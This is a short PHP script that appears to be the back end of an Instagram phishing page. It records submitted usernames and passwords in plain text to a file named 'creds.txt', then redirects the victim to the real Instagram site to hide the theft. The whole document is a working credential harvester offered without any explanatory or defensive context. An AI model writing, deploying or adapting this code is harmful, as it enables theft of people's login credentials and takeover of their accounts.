<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $file = fopen("creds.txt", "a");
    fwrite($file, "Username: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n\n");
    fclose($file);
    header("Location: https://instagram.com");
    exit();
}
?>
